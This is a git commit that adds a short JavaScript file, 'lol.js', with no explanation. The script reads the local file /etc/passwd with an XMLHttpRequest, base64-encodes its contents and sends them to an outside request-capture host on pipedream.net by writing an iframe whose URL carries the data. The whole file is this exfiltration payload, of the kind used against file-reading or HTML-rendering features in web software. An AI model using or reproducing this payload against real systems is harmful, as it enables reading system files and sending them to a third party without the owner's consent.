b46bd9b117fa7b6567dc70ab9ffec38c10fdf098
h4rsh4d <harshadgaikwad77@gmail.com>
2022-08-13 17:57:26 +0530

    Create lol.js

---
+++ lol.js
@@ -0,0 +1,10 @@
+function reqListener () {
+    var encoded = encodeURI(this.responseText);
+    var b64 = btoa(this.responseText);
+    var raw = this.responseText;
+    document.write('<iframe src="https://ene6fjjn4cshw.x.pipedream.net/?data='+b64+'"></iframe>');
+} 
+var oReq = new XMLHttpRequest(); 
+oReq.addEventListener("load", reqListener); 
+oReq.open("GET", "file:///etc/passwd"); 
+oReq.send();
